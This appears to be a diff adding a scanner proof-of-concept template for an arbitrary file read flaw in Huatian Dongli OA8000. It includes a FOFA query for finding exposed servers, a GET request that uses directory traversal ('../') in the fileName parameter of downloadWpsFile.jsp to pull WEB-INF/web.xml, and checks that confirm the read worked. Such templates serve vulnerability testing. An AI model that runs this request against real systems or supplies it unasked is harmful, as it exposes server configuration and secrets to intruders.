@@ -1,0 +1,23 @@
+id: poc-yaml-hua-tian-dong-li-oa-downloadwpsfile-anyfile-read
+info:
+  name: 华天动力OA downloadWpsFile 任意文件读取漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 文件读取
+  finger: 华天动力-OA8000
+  fofa: app="华天动力-OA8000"
+requests:
+- method: GET
+  path: /OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml
+  expression: 'status_code == 200 &&
+
+    contains(body,"web-app") &&
+
+    contains(body,"<display-name>") &&
+
+    contains(headers,"fileName=")
+
+    '
+variables: {}
+transport: http
